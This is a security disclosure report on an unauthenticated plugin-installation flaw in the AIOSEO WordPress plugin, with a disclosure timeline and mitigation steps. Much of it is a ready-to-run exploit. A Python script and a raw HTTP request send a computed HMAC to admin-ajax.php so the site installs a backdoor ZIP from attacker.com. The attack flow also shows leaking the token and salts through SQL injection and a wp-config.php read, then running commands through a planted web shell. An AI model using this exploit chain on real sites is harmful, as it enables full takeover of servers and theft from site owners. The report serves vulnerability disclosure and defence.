# AIOSEO (All in One SEO Pack) Unauthenticated Arbitrary Plugin Installation

## Executive Summary

A vulnerability in **All in One SEO (AIOSEO) Lite <= 4.9.7.2** allows an unauthenticated attacker to install and activate arbitrary WordPress plugins if the attacker can obtain the `connectToken` value stored in the database and the `wp_salt()` value from `wp-config.php`. This effectively leads to **Remote Code Execution (RCE)** because an attacker can craft a malicious plugin ZIP containing a backdoor shell, install it via an unauthenticated AJAX endpoint, and execute arbitrary commands on the server.

This vulnerability requires chaining with an **information disclosure** or **SQL injection** vulnerability in another plugin on the same site to leak the required credentials (`connectToken` + `wp_salt()`).

- **Plugin:** All in One SEO (AIOSEO) Lite
- **Affected Versions:** <= 4.9.7.2
- **Active Installations:** 3+ million
- **Severity:** Critical (Conditional — requires chained vulnerability)
- **CVE:** [PENDING ASSIGNMENT]
- **CWE:** CWE-287 (Improper Authentication), CWE-94 (Improper Control of Generation of Code)

---

## Vulnerability Details

### Root Cause

AIOSEO provides an **unauthenticated** AJAX endpoint designed to automatically install the "Pro" version after a user clicks "Connect":

```php
// File: app/Lite/Admin/Connect.php (line ~23)
add_action( 'wp_ajax_nopriv_aioseo_connect_process', [ $this, 'process' ] );
```

The `process()` method accepts two POST parameters:

| Parameter | Description |
|-----------|-------------|
| `token` | HMAC-SHA512 of the `connectToken` stored in `wp_options` |
| `file` | URL to a ZIP file containing a WordPress plugin to install |

**The endpoint is unauthenticated** (`wp_ajax_nopriv_`) and only validates the HMAC token. If the HMAC is valid, WordPress proceeds to:

1. Download the ZIP from the attacker-controlled URL
2. Extract it to `wp-content/plugins/`
3. **Activate the plugin automatically**

This results in arbitrary plugin installation and activation without any WordPress authentication.

### Vulnerable Code

**File:** `app/Lite/Admin/Connect.php`

```php
public function process() {
    // phpcs:disable HM.Security.NonceVerification.Missing, WordPress.Security.NonceVerification
    $hashedOth   = ! empty( $_POST['token'] ) ? sanitize_text_field( wp_unslash( $_POST['token'] ) ) : '';
    $downloadUrl = ! empty( $_POST['file'] )  ? esc_url_raw( wp_unslash( $_POST['file'] ) ) : '';
    // phpcs:enable

    // Check if all required params are present.
    if ( empty( $downloadUrl ) || empty( $hashedOth ) ) {
        wp_send_json_error( $error );
    }

    $oth = aioseo()->sensitiveOptions->get( 'connectToken' );
    if ( empty( $oth ) ) {
        wp_send_json_error( $error );
    }

    // Check if the stored hash matches the salted one that is sent back from the server.
    if ( hash_hmac( 'sha512', $oth, wp_salt() ) !== $hashedOth ) {
        wp_send_json_error( $error );
    }

    // Delete connect token so we don't replay.
    aioseo()->sensitiveOptions->set( 'connectToken', null );

    // ... (license check) ...

    // Install and activate plugin from remote URL
    $installer = new Utils\PluginUpgraderSilentAjax( new Utils\PluginUpgraderSkin() );
    $installer->install( $downloadUrl );
    $pluginBasename = $installer->plugin_info();
    $activated = activate_plugin( $pluginBasename, '', $network, true );
    // ...
    wp_send_json_success( $success );
}
```

### Token Generation

The `connectToken` is generated when an admin clicks "Connect to Pro":

```php
$oth       = hash( 'sha512', wp_rand() );
$hashedOth = hash_hmac( 'sha512', $oth, wp_salt() );
aioseo()->sensitiveOptions->set( 'connectToken', $oth );
```

- On **PHP 8.x**: `wp_rand()` uses `random_int()` (CSPRNG) → **unpredictable**
- On **PHP < 7.1**: `wp_rand()` uses `mt_rand()` → **potentially predictable** via state recovery

The token is stored in `wp_options` under `option_name = 'aioseo_sensitive_options'`:

```json
{"connectToken":"RAW_128_CHAR_HEX_TOKEN","connectKey":"..."}
```

---

## Attack Chain

This vulnerability is **conditional** — it requires a **secondary vulnerability** on the same site to leak the required credentials.

### Attack Flow

```
┌─────────────────────────────────────────────────────────────────────┐
│  Attacker discovers site with AIOSEO active                            │
│  + a secondary vuln (SQLi, LFI, backup leak, mt_rand predict)          │
└────────────────┬──────────────────────────────────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────────────────────────────────┐
│  STEP 1: Leak connectToken                                          │
│  Via SQL Injection in another plugin:                                 │
│  SELECT option_value FROM wp_options                                  │
│  WHERE option_name='aioseo_sensitive_options'                         │
│                                                                       │
│  Result: {"connectToken":"PENTEST_TOKEN_63125c28f33dd339..."}         │
└────────────────┬──────────────────────────────────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────────────────────────────────┐
│  STEP 2: Leak wp_salt()                                             │
│  Via LFI / file read / backup leak:                                 │
│  Read /var/www/html/wp-config.php                                   │
│                                                                       │
│  Result: define('AUTH_KEY','abc...'); define('AUTH_SALT','xyz...');   │
│  wp_salt() = AUTH_KEY + AUTH_SALT                                   │
└────────────────┬──────────────────────────────────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────────────────────────────────┐
│  STEP 3: Compute HMAC SHA512                                        │
│  HMAC = hash_hmac('sha512', connectToken, wp_salt())                │
│                                                                       │
│  Python: hmac.new(salt.encode(), token.encode(), hashlib.sha512)    │
└────────────────┬──────────────────────────────────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────────────────────────────────┐
│  STEP 4: Fire Unauthenticated Exploit                               │
│  POST /wp-admin/admin-ajax.php                                      │
│  action=aioseo_connect_process                                       │
│  token=COMPUTED_HMAC                                                 │
│  file=https://attacker.com/backdoor.zip                             │
│                                                                       │
│  ←── No WordPress cookie, no nonce, no auth required                │
└────────────────┬──────────────────────────────────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────────────────────────────────┐
│  STEP 5: RCE Confirmed                                              │
│  WordPress installs & activates backdoor plugin                      │
│  Backdoor URL: /wp-content/plugins/backdoor/shell.php?cmd=whoami      │
│  Output: www-data                                                    │
└─────────────────────────────────────────────────────────────────────┘
```

---

## Proof of Concept (PoC)

### PoC Script

**File:** `exploit_aioseo_connect.py`

```python
#!/usr/bin/env python3
"""
AIOSEO Unauthenticated Plugin Installation Exploit
Requires: connectToken (from DB leak) + wp_salt() (from wp-config.php leak)
"""

import hmac
import hashlib
import requests

TARGET_URL = "https://target.com"
MANUAL_TOKEN = "PENTEST_TOKEN_63125c28f33dd339c49d755df9ae89b4"
MANUAL_SALT = "AUTH_KEY...AUTH_SALT..."  # from wp-config.php
ZIP_URL = "https://attacker.com/backdoor.zip"

# Compute HMAC SHA512 (same as PHP hash_hmac)
hashed_token = hmac.new(
    MANUAL_SALT.encode(),
    MANUAL_TOKEN.encode(),
    hashlib.sha512
).hexdigest()

# Fire exploit
resp = requests.post(
    f"{TARGET_URL}/wp-admin/admin-ajax.php",
    data={
        "action": "aioseo_connect_process",
        "token": hashed_token,
        "file": ZIP_URL,
    },
    timeout=60,
)

print(resp.json())
# Expected: {"success":true,"data":"Plugin installed &amp; activated."}
```

### Example Request

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

action=aioseo_connect_process
&token=dbca3a902d4d105b0d36edf0bf5ed8622d500573d4ff2103d048f51be5a2dc0b60536bdfb6032805afda74f6a47a26e637d209ea1bbcd0d3b66fe090ef318132
&file=https://attacker.com/malicious-plugin.zip
```

### Example Response (Success)

```json
{"success":true,"data":"Plugin installed &amp; activated."}
```

### Example Response (Invalid Token)

```json
{"success":false,"data":"Could not install upgrade. Please download from aioseo.com and install manually."}
```

---

## Exploit Requirements

| Prerequisite | How to Obtain | Difficulty |
|-------------|---------------|------------|
| `connectToken` | SQL Injection in another plugin, backup leak, `mt_rand()` prediction (PHP < 7.1) | Medium — High |
| `wp_salt()` | LFI / Directory Traversal, backup leak, file read | Medium |
| Valid HMAC | Computed locally by attacker once token + salt known | Trivial |

**Note:** Without `connectToken` and `wp_salt()`, the HMAC verification cannot be bypassed. The token is 128 hex characters (512 bits of entropy) — brute force is computationally infeasible.

---

## Docker Verification

The vulnerability was verified in a controlled Docker environment:

1. **AIOSEO Lite 4.9.7.2** installed and active
2. `connectToken` set via wp-cli simulation
3. Salts parsed from `wp-config.php`
4. HMAC computed in Python
5. Exploit fired to `admin-ajax.php`
6. **Result:** Plugin installed and activated without authentication
7. **Backdoor confirmed:** `whoami` returned `www-data`

**Timestamp:** 2026-05-24

---

## Affected Versions

| Version | Status |
|---------|--------|
| <= 4.9.7.2 | Vulnerable |
| > 4.9.7.2 | Check vendor advisory |

---

## Mitigation

### Immediate Actions

1. **Update AIOSEO** to the latest patched version (if available)
2. **Remove `connectToken` from database** if not actively using Pro connection:
   ```sql
   DELETE FROM wp_options WHERE option_name = 'aioseo_sensitive_options';
   ```
3. **Restrict plugin installation** in `wp-config.php`:
   ```php
   define('DISALLOW_FILE_MODS', true);
   ```
4. **Monitor for unauthorized plugin installs**
5. **Audit all installed plugins** for SQL injection and file inclusion vulnerabilities

### Long-Term Recommendations

- Do not expose `wp-config.php` or database backups publicly
- Keep all WordPress plugins updated
- Use Web Application Firewall (WAF) rules to detect `aioseo_connect_process` exploitation attempts
- Consider disabling `wp_ajax_nopriv` endpoints if not required

---

## Vendor Disclosure Timeline

| Date | Event |
|------|-------|
| 2026-05-24 | Vulnerability discovered during systematic plugin audit |
| 2026-05-24 | PoC developed and tested in isolated Docker environment |
| 2026-05-24 | Report drafted |
| [PENDING] | Vendor notification |
| [PENDING] | CVE assignment |
| [PENDING] | Public disclosure (after patch or 90 days) |

---

## References

- AIOSEO WordPress Plugin: https://wordpress.org/plugins/all-in-one-seo-pack/
- AIOSEO Active Installations: 3+ million
- WordPress `wp_salt()`: https://developer.wordpress.org/reference/functions/wp_salt/
- WordPress `hash_hmac()`: https://www.php.net/manual/en/function.hash-hmac.php

---

## Credits

- **Researcher:** Yucaerin - KimiAI
- **Toolchain:** Docker dynamic validation, Python requests, wp-cli, WordPress 6.5 + PHP 8.2

---

## Disclaimer

This report is provided for educational and authorized security testing purposes only. Testing should only be performed on systems you own or have explicit written permission to test. Unauthorized access to computer systems is illegal under applicable laws.
